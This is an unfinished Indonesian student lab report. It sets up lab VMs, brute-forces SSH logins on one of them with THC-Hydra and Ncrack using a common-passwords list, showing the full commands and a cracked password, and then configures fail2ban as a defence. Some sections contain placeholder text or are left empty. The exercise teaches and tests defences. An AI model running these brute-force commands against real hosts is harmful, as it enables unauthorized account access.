# Tugas 1

## Pendahuluan
blala

## Dasar Teori

#### Oracle VM VirtualBox
adalah perangkat lunak virtualisasi, yang dapat digunakan untuk mengeksekusi sistem operasi "tambahan" di dalam sistem operasi "utama". Sebagai contoh, jika seseorang mempunyai sistem operasi MS Windows yang terpasang di komputernya, maka seseorang tersebut dapat pula menjalankan sistem operasi lain yang diinginkan di dalam sistem operasi MS Windows.

#### Ubuntu Server
system operasi turunan dari Linux Ubuntu yang di desain khusus dengan kernel yang telah dikustomisasi untuk bekerja sebagai system operasi server.

#### Xubuntu
Xubuntu adalah varian dari Ubuntu yang menggunakan desktop environment Xfce. Xubuntu dipilih karena lebih ringan dan ukurannya lebih kecil dari Ubuntu, sehingga spesifikasi hardware yang dibutuhkan lebih rendah dari Ubuntu. Xubuntu dapat diunduh dari halaman resminya yaitu https://xubuntu.org .

#### 500-worst-passwords.txt
File txt perisi 500 buah password yang digunakan dalam uji coba ini. File ini dapat diunduh di https://wiki.skullsecurity.org/images/c/ca/500-worst-passwords.txt .

#### THC-Hydra
Sebuah tools crack yang semakin unggul dalam hal exploit dan THC-Hydra salah satu yang sangat cepat meretas jaringan logon cracker yang mendukung banyak layanan yang berbeda. Dapat didownload di http://sectools.org/tool/hydra/

#### Ncrack
adalah alat cracking otentikasi jaringan berkecepatan tinggi. Ini dibangun untuk membantu perusahaan mengamankan jaringan mereka dengan secara proaktif menguji semua host dan perangkat jaringan mereka dengan kata kunci yang buruk. Profesional keamanan juga mengandalkan Ncrack saat mengaudit klien mereka. Dapat diunduh di https://nmap.org/ncrack/

#### fail2ban
adalah package keamanan yang digunakan untuk mencegah serangan brute-force dan DDoS pada linux. Fail2ban bekerja dengan memonitor jumlah kegagalan login untuk selanjutnya memblok ip address dari login yang gagal tersebut. dapat diunduh di https://www.fail2ban.org/wiki/index.php/Downloads

## Uji Penetrasi 1

#### Membuat Virtual Machine
Pada aplikasi VirtualBox, lakukan langkah berikut :
1. Pada aplikasi VirtualBox, klik tombol **New**.
1. Isikan nama, type, dan version sesuai dengan OS yang akan diinstal.
1. Atur ukuran memory (disarankan untuk menyesuaikan dengan rekomendasi dari VirtualBox).
1. Pilih opsi **Create a virtual hard disk now**.
1. Pilih opsi **VDI (VirtualBox Disk Image)**.
1. Pilih opsi **Dynamically allocated**.
1. Atur ukuran virtual hard disk (disarankan untuk menyesuaikan dengan rekomendasi dari VirtualBox).
1. Klik **Create**.
1. Lakukan proses ini dua kali, satu untuk Ubuntu Server dan satu untuk OS penetrasi.

#### Instalasi Ubuntu Server
1. Pilih Virtual Machine untuk Ubuntu Server lalu klik tombol **Start**.
1. Pilih disk image blabla


#### Instalasi Xubuntu
Pada aplikasi VirtualBox, lakukan langkah berikut :
1. Pilih Virtual Machine untuk Xubuntu lalu klik tombol **Start**.
1. Pilih disk image Xubuntu 16.04.3.
1. Masuk halaman depan instalasi Xubuntu, pilih bahasa lalu klik **Install Xubuntu**.
1. Pada pilihan instalasi third-party software silakan centang seperlunya.
1. Pilih **Erase disk and install Xubuntu** karena kita menggunakan Virtual Harddisk yang dikhususkan untuk satu OS ini.
1. Pilih lokasi atau zona waktu.
1. Pilih layout keyboard.
1. Isi data-data pengguna.
1. Tunggu hingga instalasi selesai.
1. Klik **Restart Now**.

#### Instalasi THC-Hydra
Pada OS yang digunakan untuk penetrasi, lakukan langkah berikut :
1. Buka terminal. 
1. Jalankan perintah `sudo apt-get install hydra`.

#### Instalasai Ncrack
Pada OS yang digunakan untuk penetrasi, lakukan langkah berikut :
1. Install g++ terlebih dahulu dengan menjalankan perintah `sudo apt-get isntall g++`.
1. Download Ncrack release tarball di https://nmap.org/ncrack .
1. Buka terminal.
1. Lakukan `cd` ke direktori file Ncrack berada.
1. Extract Ncrack dengan perintah `tar -xzf ncrack-0.5.tar.gz`.
1. Lakukan `cd` ke direktori hasil extract.
1. Install Ncrack dengan perintah :
```
./configure
sudo make
sudo make install
```

#### Uji penetrasi menggunakan THC-Hydra
Pada OS yang digunakan untuk penetrasi, lakukan langkah berikut :
1. Buka terminal.
1. Ketikkan perintah `hydra -l [user] -P [passlist.txt] [remote_ip] ssh`, contoh: `hydra -l pksj -P 500-worst-passwords.txt 10.0.2.4 ssh`
1. Output :
```
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-24 09:41:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 500 login tries (l:1/p:500), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 10.0.2.4   login: pksj   password: 1234
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-24 09:41:25
```

#### Uji penetrasi menggunakan Ncrack
Pada OS yang digunakan untuk penetrasi, lakukan langkah berikut :
1. Buka terminal.
1. Ketikkan perintah `ncrack -p 22 --user [user] -P [passlist.txt] [remote_ip]`, contoh: `ncrack -p 22 --user pksj -P 500-worst-passwords.txt 10.0.2.4`
1. Output :
```
Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-10-24 09:41 WIB

Ncrack done: 1 service scanned in 78.03 seconds.

Ncrack finished.

```

## Uji Penetrasi 2

#### Instalasi fail2ban`
Pada Ubuntu Server, lakukan langkah berikut :
1. Buka terminal. 
1. Jalankan perintah `sudo apt-get install fail2ban`.

#### Konfigurasi fail2ban
1. Buka file jail.conf dengan cara `nano /etc/fail2ban/jail.conf`.
1. Terdapat beberapa variabel untuk diubah. Diantaranya sebagai berikut:
> - ignoreip untuk mengabaikan ip asal yang disebutkan
> - bantime untuk menentukan waktu lama user dibanned
> - findtime dan maxretry untuk menentukan waktu dan jumlah maksimal percobaan dalam proses infiltrasi.
3. Contoh untuk membatasi penetrasi sebanyak 3 kali dalam waktu 600 detik:
```
findtime = 600
maxretry = 3
```


#### Menjalankan dan Mematikan fail2ban
1. Untuk menjalankan, jalankan perintah `sudo service fail2ban start`.
1. Untuk menghentikan, jalankan perintah `sudo service fail2ban stop`.

#### Uji Coba
output:
```

```

## Kesimpulan dan Saran
1. Penetrasi bisa dilakukan secara bruteforce dengan menggunakan aplikasi, contohnya Hydra dan NCrack.
1. Penetrasi dapat dicegah dengan memakai password yang rumit atau juga bisa dengan cara menggunakan tools pencegah penetrasi contohnya fail2ban.
1. Ketika penetrasi memakai NCrack tools hanya memberitahukan bahwa pemindaian selesai tanpa memberi tahu apa password.
